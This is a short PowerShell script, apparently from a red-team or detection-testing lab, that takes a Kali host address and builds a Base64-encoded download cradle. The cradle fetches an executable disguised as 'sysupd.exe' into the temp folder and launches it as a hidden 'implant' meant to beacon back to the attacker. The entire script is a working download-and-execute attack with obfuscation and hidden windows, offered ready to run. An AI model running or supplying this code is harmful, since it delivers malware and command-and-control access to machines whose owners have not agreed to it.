param([Parameter(Mandatory=$true)][string]$Kali, [int]$Port = 8000)
$cmd = "IWR http://${Kali}:${Port}/sysupd.exe -OutFile `$env:TEMP\sysupd.exe"
$enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
Write-Host "[1] launching encoded cradle..."
Start-Process powershell -ArgumentList "-NoProfile","-EncodedCommand",$enc -WindowStyle Hidden
Start-Sleep 8
Write-Host "[2] launching the delivered implant (keep alive)..."
if (Test-Path "$env:TEMP\sysupd.exe") { Start-Process "$env:TEMP\sysupd.exe" -WindowStyle Hidden }
else { Write-Warning "implant not delivered - is the Kali HTTP server up?" }
Write-Host "watch the LIVE panel; NET-BEACON needs ~1-2 min of callbacks"
